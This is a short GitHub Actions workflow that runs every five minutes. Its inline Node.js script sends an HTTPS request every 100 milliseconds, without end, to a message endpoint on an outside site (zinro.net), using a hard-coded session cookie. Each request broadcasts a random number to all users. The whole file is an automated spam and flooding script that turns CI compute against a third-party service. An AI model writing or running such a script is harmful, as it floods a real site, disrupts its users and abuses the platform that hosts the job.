name: F
on:
  workflow_dispatch:
  schedule:
    - cron: '*/5 * * * *'
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          node -e "const h=require('https');setInterval(()=>{
          const r=Math.floor(Math.random()*101);
          h.get(\`https://zinro.net/m/player.php?mode=message&to_user=ALL&message=\${r}\`,{headers:{'Cookie':'session_key=2'}});
          },100)"
